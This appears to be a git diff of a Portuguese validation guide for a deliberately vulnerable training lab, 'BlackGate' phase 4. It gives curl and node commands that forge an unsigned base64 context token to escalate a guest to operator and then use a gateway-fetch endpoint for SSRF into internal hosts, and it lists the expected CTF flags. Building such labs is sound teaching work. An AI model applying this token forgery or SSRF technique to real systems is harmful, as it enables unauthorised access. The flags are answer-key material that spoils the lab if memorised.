@@ -1,4 +1,4 @@
-# Validação - Lab 05 BlackGate - Fase 3
+# Validação - Lab 05 BlackGate - Fase 4
 
 ## Escopo
 
@@ -41,12 +41,12 @@ curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
 Resultado esperado:
 
 - endpoints antigos continuam respondendo;
-- `/health` retorna `1.2.0-phase3`;
-- `/api/version` retorna build `bg-phase3-weak-token`;
-- debug com header retorna diagnostics de contexto limitados;
+- `/health` retorna `1.3.0-phase4`;
+- `/api/version` retorna build `bg-phase4-gateway-trust`;
+- debug com header retorna diagnostics de contexto e gateway limitados;
 - nenhum segredo real é exposto em rota pública.
 
-## Login por terminal
+## Login e token operator
 
 ```bash
 rm -f /tmp/bg-cookie.txt
@@ -55,72 +55,12 @@ curl -i -c /tmp/bg-cookie.txt \
   -d "username=guest" \
   -d "password=guest123" \
   -X POST http://localhost:8096/login
-```
 
-Resultado esperado:
-
-- HTTP 302;
-- `Set-Cookie`;
-- redirecionamento para `/dashboard`.
-
-## Obter token de contexto
-
-```bash
-curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/context/me
-```
-
-Resultado esperado:
-
-- JSON com usuário `guest`;
-- role `guest`;
-- scope `limited`;
-- campo `context_token`.
-
-## Validar bloqueios
-
-Sem token:
-
-```bash
-curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/operator/briefing
-```
-
-Token guest padrão:
-
-```bash
-GUEST_TOKEN=$(node -e 'const p={user:"guest",role:"guest",scope:"limited",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $GUEST_TOKEN" \
-  http://localhost:8096/api/operator/briefing
-```
-
-Resultado esperado:
-
-- sem token: erro `bad_request`;
-- token guest: erro `forbidden`.
-
-## Gerar token manipulado
-
-```bash
 TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
 echo "$TOKEN"
 ```
 
-## Verificar token manipulado
-
-```bash
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  -X POST http://localhost:8096/api/context/verify
-```
-
-Resultado esperado:
-
-- `valid: true`;
-- role `operator`;
-- scope `operations`.
-
-## Acessar briefing operator
+## Fase 3 ainda funcional
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
@@ -130,11 +70,11 @@ curl -i -b /tmp/bg-cookie.txt \
 
 Resultado esperado:
 
-- HTTP 200;
-- finding `weak unsigned context token`;
-- flag `FLAG{blackgate_weak_token_role_escalation_phase3}`.
+```text
+FLAG{blackgate_weak_token_role_escalation_phase3}
+```
 
-## Acessar metadata operator
+## Gateway metadata
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
@@ -144,10 +84,78 @@ curl -i -b /tmp/bg-cookie.txt \
 
 Resultado esperado:
 
-- gateway `gw-blackgate.local`;
-- trusted upstream `api-core.internal`;
+- `gateway_fetch`;
+- allowlist de hosts internos;
 - hint de Fase 4;
-- sem SSRF real.
+- sem flag da Fase 4 nesse endpoint.
+
+## Gateway fetch health
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
+```
+
+Resultado esperado:
+
+- HTTP 200;
+- `service: api-core`;
+- `network: internal`.
+
+## Gateway fetch flag
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/metadata"
+```
+
+Resultado esperado:
+
+```text
+FLAG{blackgate_gateway_trust_ssrf_phase4}
+```
+
+## Files-vault metadata
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/metadata"
+```
+
+Resultado esperado:
+
+- `storage_mode: document-catalog`;
+- `safe_paths`;
+- `restricted_paths`;
+- hint para Fase 5.
+
+## Bloqueio externo
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://example.com"
+```
+
+Resultado esperado:
+
+- HTTP 403;
+- `blocked_upstream`.
+
+## Sem token
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
+```
+
+Resultado esperado:
+
+- erro `bad_request` ou `forbidden`;
+- nenhum acesso ao upstream simulado.
 
 ## Rotas autenticadas no navegador
 
@@ -156,6 +164,7 @@ Após login, validar:
 ```text
 /dashboard
 /context
+/gateway
 /tickets
 /assets
 /security-policy
